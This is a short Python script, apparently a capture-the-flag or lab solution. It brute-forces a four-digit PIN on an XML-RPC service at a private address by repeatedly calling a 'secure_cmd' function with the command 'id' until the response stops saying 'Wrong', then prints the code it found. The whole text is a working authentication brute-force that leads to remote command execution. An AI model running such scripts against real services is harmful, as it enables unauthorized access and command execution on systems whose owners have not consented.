import xmlrpc.client
s = xmlrpc.client.ServerProxy('http://192.168.1.10:8000')
for x in range(1000,10000):
    res = s.secure_cmd('id',x)
    if not "Wrong" in res:
        print("Pass:"+str(x))
        break
